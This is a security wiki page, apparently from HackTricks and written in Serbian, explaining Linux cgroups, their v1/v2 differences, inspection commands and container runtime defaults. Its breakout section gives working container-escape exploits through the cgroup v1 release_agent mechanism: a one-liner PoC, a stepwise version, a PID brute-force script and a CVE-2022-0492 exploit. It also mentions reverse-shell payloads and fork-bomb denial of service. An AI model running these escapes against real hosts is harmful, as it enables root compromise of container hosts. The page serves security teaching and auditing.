# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

Linux **control groups** su kernel mehanizam koji se koristi za grupisanje procesa radi računovodstva, ograničavanja, prioritizacije i sprovođenja politika. Ako su namespaces uglavnom o izolaciji pogleda na resurse, cgroups su prvenstveno o regulisanju **koliko** tih resursa skup procesa može da potroši i, u nekim slučajevima, **sa kojim klasama resursa** uopšte mogu da komuniciraju. Containers se oslanjaju na cgroups konstantno, čak i kada korisnik nikada ne pogleda direktno u njih, zato što skoro svaki moderni runtime treba način da kernelu kaže "ovi procesi pripadaju ovom workload-u, i ovo su pravila resursa koja važe za njih".

Zato container engines postavljaju novi container u sopstveno cgroup subtree. Kada je stablo procesa tamo, runtime može ograničiti memoriju, limitirati broj PIDs, dodeliti težinu korišćenju CPU-a, regulisati I/O i ograničiti pristup uređajima. U proizvodnom okruženju ovo je ključno i za multi-tenant sigurnost i za jednostavnu operativnu higijenu. Container bez smislenih kontrola resursa može da iscrpi memoriju, zatrpa sistem procesima ili monopolizuje CPU i I/O na načine koji čine host ili susedna workload-e nestabilnim.

Sa aspekta bezbednosti, cgroups su bitni na dva različita načina. Prvo, loše ili nedostajuće limite resursa omogućavaju direktne denial-of-service napade. Drugo, neke cgroup funkcije, posebno u starijim **cgroup v1** konfiguracijama, istorijski su kreirale moćne breakout primitives kada su bile zapisive iz unutrašnjosti container-a.

## v1 Vs v2

Postoje dva glavna cgroup modela u prirodi. **cgroup v1** izlaže više controller hijerarhija, i starija exploit writeups često se vrte oko čudnih i ponekad previše moćnih semantika dostupnih tamo. **cgroup v2** uvodi ujednačeniju hijerarhiju i generalno čistije ponašanje. Moderni distribucije sve više preferiraju cgroup v2, ali mešovita ili legacy okruženja i dalje postoje, što znači da su oba modela i dalje relevantna pri pregledu stvarnih sistema.

Razlika je bitna zato što su neke od najpoznatijih container breakout priča, kao zloupotrebe **`release_agent`** u cgroup v1, vezane vrlo specifično za starije cgroup ponašanje. Čitalac koji vidi cgroup exploit na blogu i zatim ga slepo primeni na moderni sistem koji koristi samo cgroup v2 verovatno će pogrešno shvatiti šta je zaista moguće na ciljnom sistemu.

## Inspekcija

Najbrži način da vidite gde se nalazi vaša trenutna shell je:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Fajl `/proc/self/cgroup` prikazuje cgroup putanje povezane sa trenutnim procesom. Na modernom cgroup v2 hostu često ćete videti jedinstveni unos. Na starijim ili hibridnim hostovima možete videti više v1 controller putanja. Kada znate putanju, možete pregledati odgovarajuće fajlove u `/sys/fs/cgroup` da biste videli ograničenja i trenutnu upotrebu.

Na hostu sa cgroup v2, sledeće komande su korisne:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Ove datoteke otkrivaju koji kontroleri postoje i koji su delegirani na child cgroups. Ovaj model delegiranja je važan u rootless i systemd-managed okruženjima, gde runtime možda može kontrolisati samo onaj podskup cgroup functionality koji parent hierarchy zaista delegira.

## Lab

Jedan način da se cgroups posmatraju u praksi je pokretanje memory-limited container-a:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Takođe možete probati PID-ograničen container:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Ovi primeri su korisni zato što pomažu da se poveže runtime zastavica sa kernel file interfejsom. Runtime ne primenjuje pravilo magijom; on upisuje relevantne cgroup postavke i zatim dozvoljava kernelu da ih sprovede na stablo procesa.

## Runtime Usage

Docker, Podman, containerd, and CRI-O svi oslanjaju na cgroups kao deo normalnog rada. Razlike obično nisu u tome da li koriste cgroups, već u tome **koje podrazumevane vrednosti biraju**, **kako komuniciraju sa systemd**, **kako funkcioniše rootless delegacija**, i **koliko konfiguracije je kontrolisano na nivou engine-a naspram nivoa orkestracije**.

U Kubernetes-u, resource requests i limits na kraju postaju cgroup konfiguracija na čvoru. Put od Pod YAML do primene od strane kernela prolazi kroz kubelet, CRI runtime i OCI runtime, ali cgroups su i dalje kernel mehanizam koji na kraju primenjuje pravilo. U Incus/LXC okruženjima, cgroups se takođe intenzivno koriste, posebno zato što system containers često izlažu bogatije stablo procesa i operativna očekivanja sličnija VM-ovima.

## Misconfigurations And Breakouts

Klasična cgroup bezbednosna priča je zapisiva **cgroup v1 `release_agent`** mehanika. U tom modelu, ako napadač može pisati u odgovarajuće cgroup fajlove, omogućiti `notify_on_release`, i kontrolisati putanju sačuvanu u `release_agent`, kernel može završiti izvršavajući putanju po izboru napadača u inicijalnim namespaces na hostu kada cgroup postane prazan. Zato stariji tekstovi posvećuju toliko pažnje zapisivosti cgroup kontrolera, mount opcijama i uslovima namespace/capability.

Čak i kada `release_agent` nije dostupan, greške u cgroup podešavanjima su i dalje važne. Preširok pristup uređajima može učiniti host uređaje dostupnim iz containera. Nedostatak memory i PID limita može jednostavnu izvršnu komandu pretvoriti u DoS na hostu. Slaba cgroup delegacija u rootless scenarijima takođe može navesti odbrambene strane da pogrešno pretpostave da ograničenje postoji kada runtime zapravo nikada nije mogao da ga primeni.

### `release_agent` Background

Tehnika `release_agent` se odnosi samo na **cgroup v1**. Osnovna ideja je da kada poslednji proces u cgroup-u izađe i `notify_on_release=1` je postavljen, kernel izvršava program čija je putanja sačuvana u `release_agent`. To izvršenje se dešava u **initial namespaces on the host**, što pretvara zapisivi `release_agent` u primitive za bekstvo iz containera.

Da bi tehnika uspela, napadaču je uglavnom potrebno:

- mogućnost pisanja u **cgroup v1** hijerarhiju
- mogućnost kreiranja ili korišćenja podređenog cgroup-a
- mogućnost postavljanja `notify_on_release`
- mogućnost upisa putanje u `release_agent`
- putanja koja se sa stanovišta hosta rešava u izvršni fajl

### Classic PoC

Istorijski jednolinijski PoC je:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Ovaj PoC upisuje payload path u `release_agent`, pokreće cgroup release i zatim pročita izlazni fajl generisan na hostu.

### Razumljivo objašnjenje

Ista ideja je lakše razumljiva ako se podeli na korake.

1. Kreirajte i pripremite upisivu cgroup:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifikujte putanju na hostu koja odgovara datotečnom sistemu kontejnera:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Drop payload koji će biti vidljiv sa host path:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Pokreni izvršavanje tako što ćeš isprazniti cgroup:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Efekat je izvršavanje payload-a na hostu sa root privilegijama. U stvarnom exploit-u, payload obično upisuje proof file, pokreće reverse shell ili menja stanje hosta.

### Varijanta sa relativnom putanjom koristeći `/proc/<pid>/root`

U nekim okruženjima, host putanja do fajl sistema kontejnera nije očigledna ili je skrivena od strane storage driver-a. U tom slučaju putanja do payload-a može biti iskazana kroz `/proc/<pid>/root/...`, gde je `<pid>` host PID koji pripada procesu u trenutnom kontejneru. To je osnova relative-path brute-force varijante:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Relevantna fora ovde nije sam brute force već oblik puta: `/proc/<pid>/root/...` omogućava kernelu da razreši fajl unutar fajl sistema containera iz host namespace-a, čak i kada direktna putanja do host storage-a nije unapred poznata.

### CVE-2022-0492 Varijanta

Godine 2022, CVE-2022-0492 je pokazao da upis u `release_agent` u cgroup v1 nije pravilno proveravao `CAP_SYS_ADMIN` u **initial** user namespace-u. Ovo je učinilo tehniku znatno dostupnijom na ranjivim kernelima, jer proces u containeru koji može mount-ovati cgroup hijerarhiju mogao je upisati u `release_agent` bez prethodnih privilegija u host user namespace-u.

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Na ranjivom kernelu, host izvršava `/proc/self/exe` sa host root privileges.

Za praktičnu zloupotrebu, počnite proverom da li okruženje još uvek izlaže writable cgroup-v1 paths ili dangerous device access:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Ako je `release_agent` prisutan i moguće je upisati u njega, već ste u legacy-breakout teritoriji:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Ako cgroup path sam po sebi ne daje escape, sledeća praktična upotreba često je denial of service ili reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Ove komande brzo ukazuju da li workload ima prostora za fork-bomb, da li može agresivno da potroši memoriju ili da zloupotrebi writable legacy cgroup interface.

## Provere

Prilikom pregleda cilja, svrha cgroup provera je da se utvrdi koji cgroup model se koristi, da li container vidi writable controller paths i da li su stari breakout primitives poput `release_agent` uopšte relevantni.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Šta je ovde zanimljivo:

- If `mount | grep cgroup` shows **cgroup v1**, older breakout writeups become more relevant.
- If `release_agent` exists and is reachable, that is immediately worth deeper investigation.
- Ako je vidljiva cgroup hijerarhija upisiva i kontejner takođe ima snažne capabilities, okruženje zaslužuje mnogo bliži pregled.

Ako otkrijete **cgroup v1**, writable controller mounts, i kontejner koji takođe ima snažne capabilities ili slabiju seccomp/AppArmor zaštitu, ta kombinacija zaslužuje posebnu pažnju. cgroups se često smatraju dosadnom temom upravljanja resursima, ali istorijski su bili deo nekih od najpoučnijih container escape chains upravo zato što granica između "resource control" i "host influence" nije uvek bila tako čista kao što su ljudi pretpostavljali.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano omogućeno | Kontejneri se automatski smeštaju u cgroups; ograničenja resursa su opcionalna osim ako nisu podešena pomoću flagova | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Podrazumevano omogućeno | `--cgroups=enabled` je podrazumevano; podrazumevana podešavanja cgroup namespace-a zavise od verzije cgroup-a (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, opušten pristup uređajima, `--privileged` |
| Kubernetes | Enabled through the runtime by default | Pods and containers are placed in cgroups by the node runtime; fine-grained resource control depends on `resources.requests` / `resources.limits` | izostavljanje resource requests/limits, privilegovani pristup uređajima, pogrešna konfiguracija runtime-a na nivou hosta |
| containerd / CRI-O | Podrazumevano omogućeno | cgroups su deo normalnog upravljanja životnim ciklusom | direktne runtime konfiguracije koje opuštaju kontrole uređaja ili izlažu nasleđene writable cgroup v1 interfejse |

Važna razlika je u tome što je **postojanje cgroup-a** obično podrazumevano, dok su **korisna ograničenja resursa** često opciona osim ako nisu eksplicitno konfigurisana.
{{#include ../../../../banners/hacktricks-training.md}}
